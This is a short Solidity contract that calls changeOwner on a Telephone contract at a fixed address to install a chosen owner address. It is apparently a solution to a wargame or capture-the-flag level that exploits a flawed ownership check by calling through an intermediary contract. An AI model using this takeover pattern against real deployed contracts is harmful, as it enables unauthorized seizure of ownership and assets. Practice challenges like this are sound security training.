// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Telephone} from "src/telephone/Telephone.sol";

contract TelephoneOwner {
    Telephone internal telephone =
        Telephone(0x76D86c10597C3fC95779C8f9fAea872FEd63Acf4);

    constructor() {}

    function changeOwner() public {
        telephone.changeOwner(0xe1f04609f7bC45e23a1BA4CD4a76f476755beBA6);
    }
}
